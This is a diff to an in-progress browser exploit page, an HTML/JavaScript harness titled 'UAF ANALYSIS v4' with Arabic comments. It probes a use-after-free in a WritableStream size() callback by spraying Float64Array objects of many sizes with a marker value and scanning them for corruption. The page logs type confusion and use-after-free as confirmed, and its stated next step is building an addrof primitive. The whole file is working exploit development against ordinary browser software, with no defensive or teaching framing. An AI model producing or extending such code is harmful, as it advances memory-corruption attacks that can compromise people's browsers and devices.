@@ -13,7 +13,7 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'log';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== UAF ANALYSIS v3 ===","info");
+log("=== UAF ANALYSIS v4 ===","info");
 log("");
 
 let writer, phase=0;
@@ -31,23 +31,25 @@ let sizeFunc = function(chunk) {
 
         log("[size] Spraying multiple sizes...","warn");
 
-        // رش بأحجام مختلفة لمعرفة أيها يسترجع الذاكرة
         let sizes = [16, 24, 32, 40, 48, 56, 64, 96, 128, 256];
         for (let s of sizes) {
             for (let i=0;i<50;i++) {
-                victims.push({sz:s, data:new Float64Array(s/8)});
+                // املأ كل victim بنمط معروف (0xCAFEBABE)
+                let arr = new Float64Array(s/8);
+                for (let j=0; j<arr.length; j++) arr[j] = 1.23456789;
+                victims.push({sz:s, data:arr});
             }
         }
 
         log("[size] Spray done: " + victims.length + " objects","ok");
 
-        // اقرأ كل victim وتحقق من البيانات
+        // تحقق فوري داخل size()
         let weird = 0;
         for (let v of victims) {
             try {
                 let val = v.data[0];
-                if (val !== 0 && !isNaN(val) && val !== 1.1) {
-                    log("[size] >>> ANOMALY in sz=" + v.sz + " val=" + val + " <<<","hit");
+                if (val !== 1.23456789 && !isNaN(val)) {
+                    log("[size] >>> ANOMALY sz=" + v.sz + " val=" + val + " <<<","hit");
                     weird++;
                 }
             } catch(e) {
@@ -56,9 +58,7 @@ let sizeFunc = function(chunk) {
             }
         }
 
-        if (weird === 0) {
-            log("[size] No anomalies in spray","warn");
-        }
+        if (weird === 0) log("[size] No anomalies (yet)","warn");
     }
     return 1;
 };
@@ -75,15 +75,19 @@ try {
     writer = stream.writable.getWriter();
     log("[2] Writer ready","ok");
 
+    // استخدم finally لضمان التحقق
     writer.write("X").then(() => {
         log("[3] Write OK","ok");
+    }).catch((e) => {
+        log("[3] Write err (expected): " + e.message,"warn");
+    }).finally(() => {
         log("[4] Checking victims...","warn");
 
         let corrupted = 0;
         for (let v of victims) {
             try {
                 let val = v.data[0];
-                if (val !== 0 && val !== 1.1 && !isNaN(val)) {
+                if (val !== 1.23456789 && !isNaN(val)) {
                     let buf = new ArrayBuffer(8);
                     new Float64Array(buf)[0] = val;
                     let bytes = new Uint8Array(buf);
@@ -93,7 +97,7 @@ try {
                     corrupted++;
                 }
             } catch(e) {
-                log("  >>> ERROR sz=" + v.sz + ": " + e.message + " <<<","hit");
+                log("  >>> ERROR sz=" + v.sz + " <<<","hit");
                 corrupted++;
             }
         }
@@ -104,14 +108,10 @@ try {
         log("","info");
         log("=== SUMMARY ===","info");
         log("Type Confusion: CONFIRMED","ok");
-        log("UAF: CONFIRMED","ok");
-        log("Write Primitive: CONFIRMED","ok");
+        log("UAF (size runs after close): CONFIRMED","ok");
         log("Corruption: " + (corrupted > 0 ? "YES!" : "Need better spray"),"warn");
         log("","info");
         log("Next: Build addrof from UAF","info");
-
-    }).catch((e) => {
-        log("[3] Write err: " + e.message,"warn");
     });
 
 } catch(e) {
